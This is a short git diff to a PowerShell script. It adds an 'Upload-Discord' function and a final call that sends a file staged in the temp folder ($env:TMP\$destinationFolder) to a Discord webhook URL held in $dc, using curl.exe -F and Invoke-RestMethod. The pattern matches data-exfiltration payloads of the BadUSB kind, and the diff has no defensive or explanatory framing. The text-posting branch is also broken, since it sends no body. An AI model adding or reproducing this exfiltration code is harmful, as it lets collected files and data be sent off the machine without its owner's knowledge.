@@ -22,3 +22,24 @@ try {
 catch {
     Write-Host "An error occurred: $_"
 }
+
+############################################################################
+function Upload-Discord {
+
+[CmdletBinding()]
+param (
+    [parameter(Position=0,Mandatory=$False)]
+    [string]$file,
+    [parameter(Position=1,Mandatory=$False)]
+    [string]$text 
+)
+
+$hookurl = "$dc"
+
+if (-not ([string]::IsNullOrEmpty($text))){
+Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post};
+
+if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $hookurl}
+}
+
+if (-not ([string]::IsNullOrEmpty($dc))){Upload-Discord -file "$env:TMP\$destinationFolder"}
